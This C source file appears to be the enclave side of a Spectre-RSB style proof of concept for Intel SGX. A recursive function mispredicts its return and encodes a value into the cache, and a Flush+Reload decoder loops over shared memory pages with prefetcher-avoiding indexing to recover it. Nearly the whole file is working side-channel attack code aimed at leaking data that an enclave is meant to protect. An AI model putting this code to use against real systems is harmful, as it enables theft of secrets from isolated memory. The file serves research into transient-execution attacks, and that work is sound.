#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */

#include "libcache/cacheutils.h"

#define enclave_printf       printf

//#define DEBUG_PRINT
#define SECRET "INACCESSIBLESECRET"

char leaked[sizeof(SECRET)];

int printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
    return 0;
}

static void NopFunction() {}

int ReturnFalse(uint64_t counter){
    if (counter > 0) {
        if (ReturnFalse(counter - 1) == 1) {
            //encode secret directly (the secret is the return value of the victim function (1))
            cache_encode('S');
        }
    } else {
        // Increase the interference if running cross-address-space.
        NopFunction();
    }
  return 0;
}

void ecall_init_attack(uint64_t meme){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
#ifdef DEBUG_PRINT
    enclave_printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif
    mem = (char*)meme;

    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET) - 1] = 0;

    flush_shared_memory();
}

void ecall_encode(char c){
    cache_encode(c);
}

int ecall_return_false(uint64_t counter){
    ReturnFalse(counter);
    return 0;
}

int ecall_cache_decode(int index){
    for (int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
      if (flush_reload(mem + mix_i * pagesize)) {
        if (mix_i == 'S') {
          // Found a candidate
          return 1;
        }
      }
    }
    return 0;
}